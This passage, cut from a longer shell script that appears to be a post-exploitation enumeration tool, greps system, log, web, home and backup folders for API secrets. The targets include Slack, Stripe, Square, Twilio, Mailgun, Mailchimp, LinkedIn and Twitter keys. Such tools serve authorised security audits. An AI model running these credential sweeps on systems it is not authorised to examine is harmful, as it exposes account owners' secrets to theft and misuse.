  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{12}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching LinkedIn Secret Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Mailchamp API Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[0-9a-f]{32}-us[0-9]{1,2}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Mailgun API Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "key-[0-9a-zA-Z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Picatic API Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sk_live_[0-9a-z]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Slack Token (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "xox[baprs]-([0-9a-zA-Z]{10,48})?" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Stripe API Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "k_live_[0-9a-zA-Z]{24}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Square Access Token (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sqOatp-[0-9A-Za-z_\-]{22}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Square Oauth Secret (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "sq0csp-[ 0-9A-Za-z_\-]{43}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Twilio API Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "SK[0-9a-fA-F]{32}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Twitter Client ID (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{18,25}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Twitter Oauth (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
